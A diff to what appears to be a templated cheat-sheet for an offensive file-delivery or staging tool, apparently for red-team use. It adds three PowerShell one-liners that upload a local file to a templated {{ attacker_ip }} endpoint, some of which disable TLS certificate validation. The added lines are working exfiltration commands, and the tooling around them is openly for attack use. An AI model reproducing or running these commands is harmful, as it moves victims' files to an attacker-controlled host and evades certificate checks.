@@ -9,7 +9,9 @@ content: |
   mkdir -p packstation/inbound; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                      -----PowerShell-----                      '; \
-  printf '%s\n' 'Upload data (PS 6+): iwr -Uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload -Method Post -Form @{file=Get-Item FILE} -SkipCertificateCheck'; \
+  printf '%s\n' 'Upload (PS 6+): iwr -Uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload?filename=FILE -Method Post -InFile FILE -ContentType application/octet-stream -SkipCertificateCheck'; \
+  printf '%s\n' 'Upload (PS 5, iwr): [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; iwr -Uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload?filename=FILE -Method Post -InFile FILE -ContentType application/octet-stream'; \
+  printf '%s\n' 'Upload (PS 5, WebClient): [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object System.Net.WebClient).UploadFile('"'"'{{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload'"'"', '"'"'FILE'"'"')'; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                         -----CMD-----                          '; \
   printf '%s\n' '================================================================'; \
